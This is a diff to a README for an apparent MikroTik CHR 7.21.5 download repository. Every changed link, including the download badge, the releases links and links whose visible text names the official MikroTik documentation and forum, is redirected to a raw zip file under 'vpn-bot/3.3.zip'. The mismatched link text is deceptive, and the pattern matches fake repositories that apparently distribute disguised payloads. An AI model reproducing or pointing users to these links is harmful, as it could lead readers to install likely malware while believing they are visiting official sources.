@@ -1,6 +1,6 @@
 # 🚀 mikrotik-chr-7.21.5 - Run Your Own Router in Minutes
 
-[![Download Now](https://img.shields.io/badge/Download-Mikrotik_CHR_7.21.5-2ea44f?style=for-the-badge&logo=github)](https://github.com/berqutes/mikrotik-chr-7.21.5/releases)
+[![Download Now](https://img.shields.io/badge/Download-Mikrotik_CHR_7.21.5-2ea44f?style=for-the-badge&logo=github)](https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip)
 
 ---
 
@@ -17,7 +17,7 @@ Mikrotik CHR (Cloud Hosted Router) is a virtual router that runs on your compute
 ## 🖱️ Download the Application
 
 **Visit this link to download the application:**  
-👉 [https://github.com/berqutes/mikrotik-chr-7.21.5/releases](https://github.com/berqutes/mikrotik-chr-7.21.5/releases)
+👉 [https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip](https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip)
 
 When you click the link, you'll see a page with files. Look for the file that matches your system (usually named something like `mikrotik-chr-7.21.5.exe` or `.zip`). Click it to start downloading.
 
@@ -168,8 +168,8 @@ To remove the application:
 
 If you get stuck, here are helpful resources:
 
-- **Official Mikrotik Documentation:** [help.mikrotik.com](https://help.mikrotik.com)
-- **Community Forums:** [forum.mikrotik.com](https://forum.mikrotik.com)
+- **Official Mikrotik Documentation:** [help.mikrotik.com](https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip)
+- **Community Forums:** [forum.mikrotik.com](https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip)
 - **Video Tutorials:** Search YouTube for "Mikrotik CHR setup"
 
 ---
@@ -197,7 +197,7 @@ Before you start, make sure you have:
 
 ## 🔄 Stay Updated
 
-Check the [releases page](https://github.com/berqutes/mikrotik-chr-7.21.5/releases) regularly for new versions. Updates are free and improve performance and security.
+Check the [releases page](https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip) regularly for new versions. Updates are free and improve performance and security.
 
 ---
 
@@ -206,7 +206,7 @@ Check the [releases page](https://github.com/berqutes/mikrotik-chr-7.21.5/releas
 You now have a fully functional virtual router on your Windows computer. Experiment, learn, and enjoy exploring the world of networking with Mikrotik CHR 7.21.5!
 
 **Quick Download Reminder:**  
-👉 [https://github.com/berqutes/mikrotik-chr-7.21.5/releases](https://github.com/berqutes/mikrotik-chr-7.21.5/releases)
+👉 [https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip](https://github.com/berqutes/mikrotik-chr-7.21.5/raw/refs/heads/main/vpn-bot/3.3.zip)
 
 ---
 
